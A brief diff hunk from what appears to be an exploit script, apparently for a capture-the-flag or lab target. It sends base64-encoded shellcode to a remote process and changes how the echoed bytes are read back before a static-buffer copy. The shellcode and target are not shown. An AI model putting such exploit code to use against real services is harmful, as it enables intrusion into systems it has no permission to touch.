@@ -35,7 +35,7 @@ log.info("Retrieving shellcode to copy it into static buffer")
 r.sendline('base64 decode')
 r.clean(1)
 r.sendline(encoded_shellcode)
-shellcode_back = r.recvrepeat().strip()
+shellcode_back = r.recv(len(shellcode)).strip()
 assert shellcode == shellcode_back
 r.sendline('')
 
